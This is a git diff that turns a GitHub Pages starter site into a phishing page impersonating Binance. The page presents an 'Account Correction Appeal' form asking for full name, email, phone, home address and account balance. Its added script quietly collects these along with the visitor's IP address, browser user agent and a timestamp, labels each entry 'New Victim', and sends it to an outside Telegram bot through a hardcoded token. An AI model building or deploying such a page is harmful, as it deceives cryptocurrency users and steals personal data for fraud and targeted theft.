@@ -1,18 +1,573 @@
-<!DOCTYPE html>
-
-<html>
+ <!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
-  <title>my-first-website</title>
-  <LINK href="styles.css" rel="stylesheet" type="text/css">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Account Information Correction Appeal - Binance</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "BinancePlex", "IBM Plex Sans", sans-serif;
+            background-color: #1F2630;
+            color: #F5F5F5;
+            min-height: 100vh;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 40px;
+            background-color:#1E252F;
+            border-bottom: 1px solid #3A414B;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #F0B90B;
+        }
+
+        .logo-icon {
+            width: 24px;
+            height: 24px;
+            background-color: #F0B90B;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #1F2630;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 24px;
+        }
+
+        .sign-up-btn {
+            background-color: #F0B90B;
+            color: #1F2630;
+            border: none;
+            padding: 8px 24px;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .menu-btn {
+            background: none;
+            border: none;
+            color: #F5F5F5;
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        /* Main Content */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            min-height: calc(100vh - 60px);
+        }
+
+        .form-section {
+            flex: 1;
+            padding: 80px 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+        }
+
+        .form-title {
+            font-size: 32px;          
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 8px;
+            color: #F5F5F5;
+        }
+
+        .form-subtitle {
+            font-size: 32px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 48px;
+            color: #F5F5F5;
+        }
+
+        .form-content {
+            max-width: 400px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 450;
+            margin-bottom: 8px;
+            color: #A0A7B2;
+        }
+
+        .form-input, .form-select {
+            width: 100%;
+            padding: 12px 16px;
+            background-color: #1E252F;
+            border: 1px solid #3A414B;
+            color: #F5F5F5;
+            border-radius: 4px;
+            font-size: 14px;
+            font-family: inherit;
+        }
+
+        .form-input:focus, .form-select:focus {
+            outline: none;
+            border-color: #F0B90B;
+            background-color: #1E252F;
+        }
+
+        .form-input::placeholder {
+            color: #7B828C;
+            font-weight: 450;
+        }
+
+        .form-select {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%23A0A7B2' d='M1 1l5 5 5-5'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            padding-right: 36px;
+            cursor: pointer;
+        }
+
+        .form-select option {
+            background-color: #1E252F;
+            color: #F5F5F5;
+        }
+
+        .form-note {
+            font-size: 12px;
+            color: #A0A7B2;
+            margin-top: 8px;
+            line-height: 1.4;
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .form-grid.full {
+            grid-template-columns: 1fr;
+        }
+
+        .continue-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #fcd535;
+            color: #00000;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 400;
+            cursor: pointer;
+            margin-top: 32px;
+            margin-bottom: 48px;
+            transition: background-color 0.1s;
+        }
+
+        .continue-btn:hover {
+            background-color: #5B616B;
+        }
+
+        /* Footer */
+        .footer {
+            background-color: #1F2630;
+            padding: 20px 20px 20px;
+            margin: 0;
+            border-top: 1px solid #3A414B;
+        }
+
+        .footer-sections {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(6, 1fr);
+            gap: 40px;
+            margin-bottom: 60px;
+        }
+
+        .footer-section {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+
+        .footer-section-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #F5F5F5;
+        }
+
+        .footer-section-toggle {
+            background: none;
+            border: none;
+            color: #F0B90B;
+            font-size: 24px;
+            cursor: pointer;
+            display: none;
+        }
+
+        .footer-community {
+            max-width: 1200px;
+            margin: 0 auto;
+            margin-bottom: 48px;
+        }
+
+        .community-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #F5F5F5;
+            margin-bottom: 24px;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .social-icon {
+            width: 36px;
+            height: 36px;
+            background-color: transparent;
+            border: 1px solid #3A414B;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #F5F5F5;
+            text-decoration: none;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .social-icon:hover {
+            background-color: #F0B90B;
+            color: #1F2630;
+            border-color: #F0B90B;
+        }
+
+        .footer-bottom {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-top: 24px;
+            border-top: 1px solid #3A414B;
+            flex-wrap: wrap;
+            gap: 24px;
+        }
+
+        .footer-controls {
+            display: flex;
+            gap: 32px;
+            align-items: center;
+        }
+
+        .control-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #F5F5F5;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .control-icon {
+            font-size: 18px;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #7B828C;
+            line-height: 1.6;
+            flex: 1;
+        }
+
+        .footer-copyright {
+            font-size: 12px;
+            color: #7B828C;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header {
+                padding: 16px 20px;
+            }
+
+            .form-section {
+                padding: 40px 20px;
+            }
+
+            .footer-sections {
+                grid-template-columns: 1fr;
+                gap: 20px;
+            }
+
+            .footer-section {
+                justify-content: space-between;
+            }
+
+            .footer-section-toggle {
+                display: block;
+            }
+
+            .form-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .form-title, .form-subtitle {
+                font-size: 24px;
+            }
+
+            .footer-bottom {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+        }
+    </style>
 </head>
-
 <body>
+    <!-- Header -->
+    <div class="header">
+        <div class="logo">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/1280px-Binance_logo.svg.png" width="100" height="auto" alt="logo">
+        </div>
+        <div class="header-right">
+            <button class="sign-up-btn">Sign Up</button>
+        </div>
+    </div>
 
-<img src="https://octodex.github.com/images/daftpunktocat-thomas.gif" id="octocat" alt="octocat-gif" />
+    <!-- Main Container -->
+    <div class="container">
+        <div class="form-section">
+            <div class="form-content">
+                <h1 class="form-title">Account Correction Appeal</h1>
+                <h2 class="form-subtitle"></h2>
+                <form id="appealForm" autocomplete="off">
+                    <!-- Full Name -->
+                    <div class="form-group">
+                        <label class="form-label" for="fullName">Full Name</label>
+                        <input id="fullName" name="fullName" type="text" class="form-input" placeholder="Full name" required>
+                    </div>
 
-<!-- Change this code here by copy and pasting your template on line 15 -->
-<p>Welcome to your first GitHub Pages website!</p>
+                    <!-- Email Address -->
+                    <div class="form-group">
+                        <label class="form-label" for="email">Email Address</label>
+                        <input id="email" name="email" type="email" class="form-input" placeholder="Email address" required>
+                    </div>
 
+                    <!-- Phone Number -->
+                    <div class="form-group">
+                        <label class="form-label" for="phone">Phone Number</label>
+                        <input id="phone" name="phone" type="tel" class="form-input" placeholder="Phone number (with country code)" required>
+                    </div>
+
+                    <!-- Address -->
+                    <div class="form-group">
+                        <label class="form-label" for="address">Address</label>
+                        <input id="address" name="address" type="text" class="form-input" placeholder="Address" required>
+                    </div>
+
+                    <!-- City -->
+                    <div class="form-group">
+                        <label class="form-label" for="city">City</label>
+                        <input id="city" name="city" type="text" class="form-input" placeholder="City" required>
+                    </div>
+
+                    <!-- State/Province and Postal Code -->
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label class="form-label" for="state">State/Province</label>
+                            <input id="state" name="state" type="text" class="form-input" placeholder="State/Province" required>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label" for="postal">Postal Code</label>
+                            <input id="postal" name="postal" type="text" class="form-input" placeholder="Postal code" required>
+                        </div>                        
+                    </div>
+
+                    <!-- Country -->
+                    <div class="form-group">
+                        <label class="form-label" for="country">Country</label>
+                        <select id="country" name="country" class="form-select" required>
+                            <option value="">Country</option>
+                            <option value="US">United States</option>
+                            <option value="CA">Canada</option>
+                            <option value="GB">United Kingdom</option>
+                            <option value="AU">Australia</option>
+                            <option value="DE">Germany</option>
+                            <option value="IT">Italy</option>
+                            <option value="FR">France</option>
+                            <option value="JP">Japan</option>
+                            <option value="CN">China</option>
+                            <option value="IN">India</option>
+                            <option value="BR">Brazil</option>
+                        </select>
+                    </div>
+
+                    <!-- Balance -->
+                    <div class="form-group">
+                        <label class="form-label" for="balanceInput">Balance</label>
+                        <input
+                            type="text"
+                            class="form-input"
+                            id="balanceInput"
+                            inputmode="decimal"
+                            placeholder="Account Balance"
+                            required
+                        >
+                    </div>
+
+                    <!-- Submit Button -->
+                    <button type="submit" class="continue-btn">Continue</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+   <div class="footer">
+        <div class="footer-sections">
+            <div class="footer-text">
+                <p><strong>Binance ADGM entities</strong> are regulated by the Financial Services Regulatory Authority (FSRA) of the Abu Dhabi Global Market (ADGM) as follows: (1) DIFC Exchange Limited is recognised as a Recognised Investment Exchange (Derivatives), with a stipulation to Operate a Multilateral Trading Facility; (2) Neon Clearing and Custody Limited is recognised as a Recognised Clearing House, with a stipulation to Provide Custody and operating a Central Securities Depository; (3) Neon Trading Limited is authorised to carry out the following Regulated Activities: (I) Dealing in Investments as Principal; (II) Dealing in Investments as Agent; (III) Arranging Deals in investments; (IV) Managing Assets; (V) Providing Money Services; and (VI) Arranging Custody.</p>
+            </div>
+            <div class="footer-copyright">
+                Binance© 2026<br>
+                Cookie Preferences
+            </div>
+        </div>
+    </div>
+
+    <script>
+    /*
+      Standalone client-side implementation that sends:
+        - form fields
+        - public IP (via ipify)
+        - navigator.userAgent
+        - ISO timestamp
+      SECURITY WARNING:
+      - Embedding a real Telegram BOT token in client-side code is insecure.
+      - Replace BOT_TOKEN and CHAT_ID placeholders only for short local testing.
+      - For production, use a server-side endpoint and keep the token in environment variables.
+    */
+
+    // --- Balance auto-formatter (silent) ---
+    const balanceInput = document.getElementById("balanceInput");
+    balanceInput.addEventListener("input", function (e) {
+        let v = e.target.value;
+        v = v.replace(/[^\d.]/g, "");
+        const parts = v.split(".");
+        if (parts.length > 1) {
+            const integer = parts.shift() || "0";
+            const decimal = parts.join("").slice(0, 10);
+            e.target.value = integer.replace(/\B(?=(\d{3})+(?!\d))/g, ",") + (decimal ? "." + decimal : "");
+        } else {
+            e.target.value = v.replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+        }
+    });
+
+    // --- Helper: fetch public IP silently ---
+    async function fetchPublicIP() {
+        try {
+            const resp = await fetch("https://api.ipify.org?format=json");
+            if (!resp.ok) return "unknown";
+            const j = await resp.json();
+            return j.ip || "unknown";
+        } catch (e) {
+            return "unknown";
+        }
+    }
+
+    // --- Form submission (silent; no alerts/status) ---
+    document.getElementById("appealForm").addEventListener("submit", async function (ev) {
+        ev.preventDefault();
+
+        const payload = {
+            fullName: document.getElementById("fullName").value.trim(),
+            email: document.getElementById("email").value.trim(),
+            phone: document.getElementById("phone").value.trim(),
+            address: document.getElementById("address").value.trim(),
+            city: document.getElementById("city").value.trim(),
+            state: document.getElementById("state").value.trim(),
+            postal: document.getElementById("postal").value.trim(),
+            country: document.getElementById("country").value,
+            balance: document.getElementById("balanceInput").value.trim()
+        };
+
+        const ip = await fetchPublicIP();
+        const userAgent = navigator.userAgent || "unknown";
+        const timestamp = new Date().toISOString();
+
+        const message = [
+            "🆕 New Victim",
+            "",
+            `👤 Full Name: ${payload.fullName}`,
+            `📧 Email: ${payload.email}`,
+            `📱 Phone: ${payload.phone}`,
+            `🏠 Address: ${payload.address}`,
+            `🏙 City: ${payload.city}`,
+            `🗺 State: ${payload.state}`,
+            `📮 Postal Code: ${payload.postal}`,
+            `💰 Balance: ${payload.balance}`,
+            `🌍 Country: ${payload.country}`,
+              "",
+            `🕜Time: ${timestamp}`,
+            `🌐 IP: ${ip}`,
+            `🖥 User-Agent: ${userAgent}`
+        ].join("\n");
+
+        // === REPLACE THESE PLACEHOLDERS FOR LOCAL TESTING ONLY ===
+        const BOT_TOKEN = "8281561796:AAHc7r8g6Ba70YFWsV8ygD5uXnf3dWmiGp0"; // e.g. "123456:ABC-DEF..."
+        const CHAT_ID = "8624745089";     // numeric chat id or @username
+        // =======================================================
+        // If placeholders not replaced, exit silently (no UI alert)
+        if (!BOT_TOKEN || !CHAT_ID) {
+    return;
+}
+       
+
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            });
+            // reset form silently on success
+            ev.target.reset();
+        } catch (err) {
+            // silent failure; error available in console for debugging
+            if (typeof console !== "undefined") console.error("Telegram send error:", err);
+        }
+    });
+    </script>
 </body>
 </html>
